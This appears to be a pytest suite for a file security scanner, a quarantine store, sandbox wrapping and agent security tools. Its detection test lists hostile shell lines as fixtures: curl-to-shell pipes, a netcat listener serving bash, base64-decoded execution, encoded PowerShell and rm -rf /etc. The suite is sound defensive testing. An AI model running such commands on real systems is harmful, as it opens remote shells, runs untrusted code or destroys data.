"""Security: scanner detections, quarantine round-trip, sandbox argv,
agent tools."""
import json
import zipfile
import pytest
from pathlib import Path

from src.security_scanner import scan_file, ScanResult, Finding


# ---- scanner: clean files ------------------------------------------------

def test_clean_text_file_has_no_findings(tmp_path):
    p = tmp_path / "hello.txt"; p.write_text("Hello, world.\n")
    sr = scan_file(p)
    assert sr.risk_level == "clean"
    assert sr.findings == []


# ---- scanner: dangerous extensions --------------------------------------

@pytest.mark.parametrize("ext", [".exe", ".bat", ".scr", ".ps1", ".vbs",
                                  ".cmd", ".jar", ".dmg", ".msi", ".apk"])
def test_dangerous_extension_flagged(tmp_path, ext):
    p = tmp_path / f"thing{ext}"; p.write_bytes(b"\x00" * 16)
    sr = scan_file(p)
    cats = {f.category for f in sr.findings}
    assert "executable_extension" in cats
    assert sr.risk_level == "dangerous"


# ---- scanner: extension vs magic mismatch --------------------------------

def test_renamed_pdf_is_actually_zip_flagged(tmp_path):
    """Phishing pattern: ZIP-based content with .pdf extension — magic
    bytes say PK..., extension says PDF."""
    p = tmp_path / "report.pdf"
    # Build a tiny valid zip.
    with zipfile.ZipFile(p, "w") as z: z.writestr("dummy.txt", "x")
    sr = scan_file(p)
    cats = {f.category for f in sr.findings}
    assert "extension_mismatch" in cats


@pytest.mark.parametrize("name", [
    "ok.xlsx", "ok.docx", "ok.pptx",
    "ok.epub", "ok.jar", "ok.apk", "ok.odt", "ok.ods",
])
def test_zip_based_office_packages_dont_false_positive(tmp_path, name):
    """A plain zip with a known office / package extension must NOT be
    flagged as extension_mismatch — these formats are all PK-headed.
    Regression: the snapshot_matrix harness hung on a clean .xlsx
    because the scanner used to fire here."""
    p = tmp_path / name
    with zipfile.ZipFile(p, "w") as z: z.writestr("dummy.txt", "x")
    sr = scan_file(p)
    cats = {f.category for f in sr.findings}
    assert "extension_mismatch" not in cats, \
        f"{name} false-positively flagged: {[(f.severity, f.category) for f in sr.findings]}"


# ---- scanner: VBA macro detection ---------------------------------------

def test_vba_macro_in_docx_warned(tmp_path):
    p = tmp_path / "macro_doc.docx"
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("[Content_Types].xml", "<x/>")
        z.writestr("word/vbaProject.bin", b"\x00" * 32)  # the smoking gun
    sr = scan_file(p)
    cats = {f.category for f in sr.findings}
    assert "office_macro" in cats
    assert sr.risk_level == "suspicious"


# ---- scanner: PDF active content ---------------------------------------

@pytest.mark.parametrize("trigger", [b"/JavaScript", b"/Launch",
                                       b"/OpenAction"])
def test_pdf_active_content_flagged(tmp_path, trigger):
    p = tmp_path / "evil.pdf"
    p.write_bytes(b"%PDF-1.7\n" + b"\x00" * 100 + trigger + b"\x00" * 100)
    sr = scan_file(p)
    cats = {f.category for f in sr.findings}
    assert "pdf_active_content" in cats


# ---- scanner: HTML / SVG embedded scripts -------------------------------

def test_svg_with_script_warned(tmp_path):
    p = tmp_path / "thing.svg"
    p.write_bytes(b'<svg><script>alert(1)</script></svg>')
    sr = scan_file(p)
    cats = {f.category for f in sr.findings}
    assert "embedded_script" in cats


# ---- scanner: suspicious shell patterns --------------------------------

@pytest.mark.parametrize("body,expected_label", [
    (b"curl -fsSL https://example.com/install.sh | sh\n", "remote-shell pipe"),
    (b"wget -O- https://x.io | bash\n", "remote-shell pipe"),
    (b"echo 'YmFkX2NvZGU=' | base64 -d | bash\n", "base64-decoded shell"),
    (b"powershell -enc SQBuAHYAbwBrAGUA\n", "PowerShell evasion flags"),
    (b"nc -lvp 4444 -e /bin/bash\n", "netcat listener"),
    (b"chmod +x /tmp/payload && ./payload\n", "stage-and-execute"),
    (b"rm -rf /etc\n", "destructive `rm -rf`"),
    (b"python3 -c \"exec(__import__('base64').b64decode(b''))\"\n",
     "python -c exec"),
    (b"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"
     b"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"
     b"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90", "hex-encoded payload"),
])
def test_suspicious_pattern_detected(tmp_path, body, expected_label):
    p = tmp_path / "script.sh"
    p.write_bytes(b"#!/bin/sh\n" + body)
    sr = scan_file(p)
    descs = " | ".join(f.description for f in sr.findings)
    assert expected_label in descs, f"didn't detect {expected_label!r}: {descs}"


# ---- scanner: missing file --------------------------------------------

def test_missing_file_returns_warning(tmp_path):
    sr = scan_file(tmp_path / "nope.txt")
    assert sr.findings
    assert sr.findings[0].category == "missing_file"


# ---- ScanResult helpers ------------------------------------------------

def test_scan_result_to_markdown_has_essentials():
    sr = ScanResult(path="/x/foo.exe")
    sr.findings.append(Finding("dangerous", "executable_extension", "x"))
    md = sr.to_markdown()
    assert "Risk level" in md and "dangerous" in md
    assert "executable_extension" in md


def test_scan_result_clean_when_no_findings():
    assert ScanResult(path="/x").risk_level == "clean"


# =============================================================
# Quarantine
# =============================================================

import src.quarantine as quar


@pytest.fixture
def quar_root(tmp_path, monkeypatch):
    monkeypatch.setattr(quar, "_ROOT", tmp_path / "q")
    yield tmp_path / "q"


def test_quarantine_round_trip(quar_root, tmp_path):
    src = tmp_path / "evil.exe"; src.write_bytes(b"\x4d\x5a" + b"\x00" * 30)
    rec = quar.quarantine_file(src, reason="test")
    assert not src.exists()                       # original gone
    assert Path(rec.quarantined_path).is_file()
    listing = quar.list_quarantined()
    assert len(listing) == 1 and listing[0].id == rec.id
    # Restore.
    final = quar.restore_file(rec.id)
    assert Path(final).is_file()
    assert quar.list_quarantined() == []


def test_quarantine_records_findings(quar_root, tmp_path):
    src = tmp_path / "evil.bat"; src.write_bytes(b"@echo off\n")
    sr = scan_file(src)
    rec = quar.quarantine_file(src, reason="auto", scan=sr)
    assert rec.findings
    assert any(f.get("category") == "executable_extension"
               for f in rec.findings)


def test_quarantine_refuses_missing_file(quar_root, tmp_path):
    with pytest.raises(FileNotFoundError):
        quar.quarantine_file(tmp_path / "nope.txt")


def test_restore_refuses_to_clobber(quar_root, tmp_path):
    src = tmp_path / "f.txt"; src.write_text("body\n")
    rec = quar.quarantine_file(src)
    src.write_text("REPLACED\n")     # someone re-created the file
    with pytest.raises(FileExistsError):
        quar.restore_file(rec.id)


def test_delete_permanently_removes_entry(quar_root, tmp_path):
    src = tmp_path / "z.txt"; src.write_text("x")
    rec = quar.quarantine_file(src)
    assert quar.delete_permanently(rec.id) is True
    assert quar.list_quarantined() == []


# =============================================================
# Sandbox argv wrapping
# =============================================================

def test_sandbox_wrap_returns_argv_unchanged_when_unavailable(monkeypatch):
    from src import sandbox
    monkeypatch.setattr(sandbox, "sandbox_available", lambda: (False, ""))
    out = sandbox.wrap_argv(["echo", "hello"])
    assert out == ["echo", "hello"]


def test_sandbox_wrap_macos(monkeypatch):
    from src import sandbox
    monkeypatch.setattr(sandbox, "sandbox_available",
                        lambda: (True, "sandbox-exec"))
    out = sandbox.wrap_argv(["echo", "hello"], no_network=True)
    assert out[0] == "sandbox-exec"
    assert "deny network*" in out[2]
    assert out[-2:] == ["echo", "hello"]


def test_sandbox_wrap_linux_firejail(monkeypatch):
    from src import sandbox
    monkeypatch.setattr(sandbox, "sandbox_available", lambda: (True, "firejail"))
    out = sandbox.wrap_argv(["echo", "hello"], no_network=True)
    assert out[0] == "firejail"
    assert "--net=none" in out
    assert "echo" in out and "hello" in out


# =============================================================
# Agent tools
# =============================================================

class _FakeSettings:
    def __init__(self, **kw):
        self.agent_can_purge_quarantine = kw.get(
            "agent_can_purge_quarantine", False)


class _FakeWindow:
    def __init__(self, **kw):
        class _SM:
            def __init__(s, settings): s.display = settings
        self.settings_manager = _SM(_FakeSettings(**kw))


def test_scan_file_tool_returns_json(tmp_path):
    from src.llm.tools_security import _scan_file
    p = tmp_path / "thing.exe"; p.write_bytes(b"\x00")
    out = _scan_file(_FakeWindow(), path=str(p))
    data = json.loads(out)
    assert data["risk_level"] == "dangerous"
    assert data["findings"]


def test_quarantine_file_tool(quar_root, tmp_path):
    from src.llm.tools_security import _quarantine_file
    p = tmp_path / "f.bat"; p.write_text("@echo off")
    out = _quarantine_file(_FakeWindow(), path=str(p),
                           reason="test")
    assert "Quarantined" in out


def test_restore_quarantined_tool(quar_root, tmp_path):
    from src.llm.tools_security import _quarantine_file, _restore_quarantined
    p = tmp_path / "f.txt"; p.write_text("abc")
    out = _quarantine_file(_FakeWindow(), path=str(p))
    qid = out.rsplit(":", 1)[1].strip()
    out2 = _restore_quarantined(_FakeWindow(), qid=qid)
    assert "Restored" in out2


def test_list_quarantined_tool(quar_root, tmp_path):
    from src.llm.tools_security import _list_quarantined, _quarantine_file
    p = tmp_path / "x.txt"; p.write_text("a")
    _quarantine_file(_FakeWindow(), path=str(p), reason="r1")
    out = _list_quarantined(_FakeWindow())
    assert "quarantined file" in out


def test_delete_quarantined_blocked_without_setting(quar_root):
    from src.llm.tools_security import _delete_quarantined
    out = _delete_quarantined(_FakeWindow(), qid="abcd")
    assert "ERROR" in out
    assert "agent_can_purge_quarantine" in out


def test_delete_quarantined_works_when_enabled(quar_root, tmp_path):
    from src.llm.tools_security import _quarantine_file, _delete_quarantined
    p = tmp_path / "f.txt"; p.write_text("a")
    out = _quarantine_file(_FakeWindow(), path=str(p))
    qid = out.rsplit(":", 1)[1].strip()
    out2 = _delete_quarantined(
        _FakeWindow(agent_can_purge_quarantine=True), qid=qid)
    assert "Purged" in out2


# ---- registration ----------------------------------------------------------

def test_security_tools_registered():
    from src.llm.tools import READ_ONLY_TOOLS, ACTION_TOOLS
    ro = {t.name for t in READ_ONLY_TOOLS}
    act = {t.name for t in ACTION_TOOLS}
    assert {"scan_file", "list_quarantined"} <= ro
    assert {"quarantine_file", "restore_quarantined",
            "delete_quarantined"} <= act
